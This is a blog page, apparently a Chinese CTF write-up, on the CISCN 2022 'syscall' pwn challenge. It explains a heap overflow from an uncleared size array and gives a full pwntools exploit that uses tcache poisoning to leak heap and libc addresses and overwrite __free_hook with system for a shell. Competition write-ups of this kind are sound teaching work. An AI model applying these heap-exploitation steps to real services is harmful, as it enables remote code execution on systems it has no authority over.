@@ -1,0 +1,542 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="我他喵的" href="http://example.com/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="我他喵的" href="http://example.com/atom.xml" />
+<link rel="alternate" type="application/json" title="我他喵的" href="http://example.com/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="writeup" />
+
+
+<link rel="canonical" href="http://example.com/2022/06/18/ciscn2022-syscall/">
+
+
+
+  <title>
+ciscn2022_syscall - pwn |
+dreamcat = 我他喵的</title>
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">ciscn2022_syscall
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="Created: 2022-06-18 21:15:41">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">Posted on</span>
+    <time itemprop="dateCreated datePublished" datetime="2022-06-18T21:15:41+08:00">2022-06-18</time>
+  </span>
+  <span class="item" title="Symbols count in article">
+    <span class="icon">
+      <i class="ic i-pen"></i>
+    </span>
+    <span class="text">Symbols count in article</span>
+    <span>4.8k</span>
+    <span class="text">words</span>
+  </span>
+  <span class="item" title="Reading time">
+    <span class="icon">
+      <i class="ic i-clock"></i>
+    </span>
+    <span class="text">Reading time</span>
+    <span>4 mins.</span>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="Toggle navigation bar">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">dreamcat</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicm0fdw5cj20zk0m8hdt.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giciuv0socj20zk0m8qes.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipexbei4hj20zk0m8npd.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipexoj0moj20zk0m8kgu.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclg5ms2rj20zk0m8u0x.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclxp31goj20zk0m8qv5.jpg"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">Home</a></span><i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/pwn/" itemprop="item" rel="index" title="In pwn"><span itemprop="name">pwn</span></a>
+<meta itemprop="position" content="1" /></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="en">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2022/06/18/ciscn2022-syscall/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="dreamcat">
+    <meta itemprop="description" content=", ">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="我他喵的">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <h1 id="ciscn2022_syscall"><a class="markdownIt-Anchor" href="#ciscn2022_syscall">#</a> ciscn2022_syscall</h1>
+<p>程序的漏洞点在于 free 后不会清空 size 数组对应的数据，而且在同一个该位置再次申请一个 chunk 的时候，</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( choice == <span class="number">17</span> )                    <span class="comment">// malloc</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = (syscall)(<span class="number">38929LL</span>, sub_E1B, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">      <span class="keyword">if</span> ( idx &lt; <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_32;</span><br><span class="line">      <span class="keyword">if</span> ( idx &gt; <span class="number">4</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_32;</span><br><span class="line">      <span class="keyword">if</span> ( (syscall)(<span class="number">38929LL</span>, getheap_ptr, idx, <span class="number">0LL</span>) )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_32;</span><br><span class="line">      v2 = (syscall)(<span class="number">38929LL</span>, strings, <span class="number">5LL</span>, <span class="number">0LL</span>);</span><br><span class="line">      (syscall)(<span class="number">38929LL</span>, printf_, v2, <span class="number">5LL</span>);</span><br><span class="line">      szie = (syscall)(<span class="number">38929LL</span>, read_, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">      <span class="keyword">if</span> ( szie &lt;= <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_32;</span><br><span class="line">      <span class="keyword">if</span> ( szie &gt; <span class="number">40</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_32;</span><br><span class="line">      v3 = (syscall)(<span class="number">38929LL</span>, malloc_, szie, <span class="number">0LL</span>);<span class="comment">// malloc</span></span><br><span class="line">      (syscall)(<span class="number">38929LL</span>, saveheap, idx, v3);</span><br><span class="line">      v4 = (syscall)(<span class="number">38929LL</span>, strings, <span class="number">9LL</span>, <span class="number">0LL</span>);</span><br><span class="line">      (syscall)(<span class="number">38929LL</span>, printf_, v4, <span class="number">0LL</span>);</span><br><span class="line">      v5 = szie;</span><br><span class="line">      v6 = (syscall)(<span class="number">38929LL</span>, getheap_ptr, idx, <span class="number">0LL</span>);</span><br><span class="line">      (syscall)(<span class="number">0x1231</span>LL, v6, v5, <span class="number">0LL</span>);</span><br><span class="line">      v7 = (syscall)(<span class="number">38929LL</span>, getheap_ptr, idx, <span class="number">0LL</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (syscall)(<span class="number">38929LL</span>, sub_E62, v7, <span class="number">0LL</span>) )<span class="comment">// ke I					//这里会检查我们输入的数据是否为DEADBEEF</span></span><br><span class="line">        <span class="keyword">goto</span> LABEL_32;													<span class="comment">//如果是就会跳转，而下面则是记录这次我们申请的size</span></span><br><span class="line">      (syscall)(<span class="number">38929LL</span>, read_context, idx, szie);</span><br><span class="line">      v8 = (syscall)(<span class="number">38929LL</span>, getheap_ptr, idx, <span class="number">0LL</span>) &amp; <span class="number">0xFFF</span>;</span><br><span class="line">      v9 = (syscall)(<span class="number">38929LL</span>, strings, <span class="number">7LL</span>, <span class="number">0LL</span>);</span><br><span class="line">      (syscall)(<span class="number">38929LL</span>, printf_, v9, v8);</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br><span class="line">      </span><br></pre></td></tr></table></figure>
+<p>// 如果是就会跳转，而下面则是记录这次我们申请的 size，这里一旦跳转，size 数组不会被更改，可能存在溢出。如上一次我们在这个位置放的堆块，申请的 size 是 0x28, 下一次我们申请的是 0x10，数据为 DEADBEEF，这里的 size 依旧是 0x28，造成溢出。</p>
+<p>思路</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x28</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x28</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x28</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x28</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x28</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
+<p>申请出来四个 chunk，size 数组都是为 0x28</p>
+<p>然后申请 4 个 0x10，数据为 DEADBEEF</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">new_add</span>():</span><br><span class="line">    r.sendline(<span class="string">b&#x27;17&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;size: &#x27;</span>,<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    r.sendafter(<span class="string">&#x27;content: &#x27;</span>,<span class="built_in">str</span>(<span class="string">&#x27;DEADBEEF&#x27;</span>)) </span><br><span class="line"></span><br><span class="line">new_add()</span><br><span class="line">new_add()</span><br><span class="line">new_add()</span><br><span class="line">new_add()</span><br></pre></td></tr></table></figure>
+<p>这里就会造成溢出。先后释放 2，1，两个 chunk 进入 tcache，并且 1 对应的 chunk 的 fd 指针指向 2，chunk0 只有 0x20。我们输出 chunk0，一共输出 0x28 字节，将 chunk1 的 fd 指针泄露出来，就完成了堆地址的泄露。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">r.recv(<span class="number">0x20</span>)</span><br><span class="line">heap_addr = u64(r.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+<p>接下来，我们修改 chunk3 的头部，将其 size 从 0x21 改为 largebin 的大小范围，free (3) 令其进入 unsortedbins，我们在申请时，不要覆盖掉原本的 bk 指针就可以泄露出 libc 的地址。</p>
+<p>这里 free (3) 要绕过检查，所以我们将伪造他的下一个 chunk 的 size。先后释放 2,1, 使 chunk1 的 fd 指向 chunk2，利用 chunk0 的溢出，修改 chnnk1 的 fd，使其指向我们的目标地址。将伪造的 chunk3 的下一个堆的头写为合法的大小。同时这个伪造的 chunk 的下一堆的 size 也要合法，但是我们只能写 0x28 字节，所以我们将第一个伪造成 0x11，</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">new_add() <span class="comment">#1 0x370</span></span><br><span class="line"></span><br><span class="line">new_add() <span class="comment">#2 0x390</span></span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x501</span>))</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">aimed_addr = heap_addr+<span class="number">0x10</span>+<span class="number">0x500</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0x21</span>)*<span class="number">4</span>+p64(aimed_addr))</span><br><span class="line">new_add()       <span class="comment">#1  0x370</span></span><br><span class="line"></span><br><span class="line">new_add()    <span class="comment">#20x8a0</span></span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x11</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x11</span>))</span><br></pre></td></tr></table></figure>
+<p>现在 chunk3 就可以正常 free，绕过检查。我们从 unsortedbins 上申请一个 chunk，完成 libc 的泄露</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">3</span>)</span><br><span class="line">new_add()</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">r.recv(<span class="number">8</span>)</span><br><span class="line">libcbase = u64(r.recv(<span class="number">8</span>))-<span class="number">0x3ec0d0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libcbase))</span><br></pre></td></tr></table></figure>
+<p>后面就是我们修改__free_hook 数据为 system 地址，触发 getshell</p>
+<p>同样的手法。chunk0 修改 chunk1 的 fd，只不过这次是先后释放 3，1，chunk1 原本指向 chunk3</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">system = libcbase+ libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = libcbase + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+p64(free_hook))</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,p64(system))</span><br><span class="line">pause()</span><br><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+<p>getflag</p>
+<p><img data-src="C:%5CUsers%5C32644%5CDesktop%5Cciscn%5C%E5%8D%8A%E5%86%B3%E8%B5%9B%5C%E8%B5%9B%E9%A2%98%5C%E4%BA%8C%E8%BF%9B%E5%88%B6%5C1%5C1655218920143203%5CQQ%E5%9B%BE%E7%89%8720220618214051.png" alt="QQ图片20220618214051"></p>
+<p>完整 exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#r = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">r=remote(<span class="string">&#x27;172.16.9.42&#x27;</span>,<span class="number">8083</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">sz,content</span>):</span><br><span class="line">    r.sendline(<span class="string">b&#x27;17&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;size: &#x27;</span>,<span class="built_in">str</span>(sz))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    r.sendafter(<span class="string">&#x27;content: &#x27;</span>,content)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;addr: &#x27;</span>)</span><br><span class="line">    offset = <span class="built_in">int</span>(r.recv(<span class="number">5</span>),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> offset</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new_add</span>():</span><br><span class="line">    r.sendline(<span class="string">b&#x27;17&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;size: &#x27;</span>,<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    r.sendafter(<span class="string">&#x27;content: &#x27;</span>,<span class="built_in">str</span>(<span class="string">&#x27;DEADBEEF&#x27;</span>)) </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    r.sendline(<span class="string">b&#x27;68&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;idx: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    r.sendafter(<span class="string">&#x27;content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    r.sendline(<span class="string">b&#x27;51&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;idx: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    r.sendline(<span class="string">&#x27;34&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;idx: &#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x28</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x28</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x28</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x28</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">new_add()</span><br><span class="line">new_add()</span><br><span class="line">new_add()</span><br><span class="line">new_add()</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">r.recv(<span class="number">0x20</span>)</span><br><span class="line">heap_addr = u64(r.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"> </span><br><span class="line">new_add() <span class="comment">#1 0x370</span></span><br><span class="line"></span><br><span class="line">new_add() <span class="comment">#2 0x390</span></span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x501</span>))</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">aimed_addr = heap_addr+<span class="number">0x10</span>+<span class="number">0x500</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0x21</span>)*<span class="number">4</span>+p64(aimed_addr))</span><br><span class="line">new_add()       <span class="comment">#1  0x370</span></span><br><span class="line"></span><br><span class="line">new_add()    <span class="comment">#20x8a0</span></span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x11</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x11</span>))</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">new_add()</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">r.recv(<span class="number">8</span>)</span><br><span class="line">libcbase = u64(r.recv(<span class="number">8</span>))-<span class="number">0x3ec0d0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line">system = libcbase+ libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = libcbase + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+p64(free_hook))</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,p64(system))</span><br><span class="line">pause()</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+      <div class="tags">
+          <a href="/tags/writeup/" rel="tag"><i class="ic i-tag"></i> writeup</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">Edited on</span>
+    <time title="Modified: 2022-06-21 06:18:41" itemprop="dateModified" datetime="2022-06-21T06:18:41+08:00">2022-06-21</time>
+  </span>
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> Donate</button>
+  <p>Give me a cup of [coffee]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt="dreamcat WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt="dreamcat Alipay">
+        <p>Alipay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/paypal.png" alt="dreamcat PayPal">
+        <p>PayPal</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>Post author:  </strong>dreamcat <i class="ic i-at"><em>@</em></i>我他喵的
+  </li>
+  <li class="link">
+    <strong>Post link: </strong>
+    <a href="http://example.com/2022/06/18/ciscn2022-syscall/" title="ciscn2022_syscall">http://example.com/2022/06/18/ciscn2022-syscall/</a>
+  </li>
+  <li class="license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2022/06/11/vm%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclxxcb6rj20zk0m8b29.jpg" title="vm学习笔记">
+  <span class="type">Previous Post</span>
+  <span class="category"><i class="ic i-flag"></i> </span>
+  <h3>vm学习笔记</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+      
+
+  <a href="/2022/06/19/ciscn-2022-popcalc/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclxxcb6rj20zk0m8b29.jpg" title="ciscn_2022_popcalc">
+  <span class="type">Next Post</span>
+  <span class="category"><i class="ic i-flag"></i> pwn</span>
+  <h3>ciscn_2022_popcalc</h3>
+  </a>
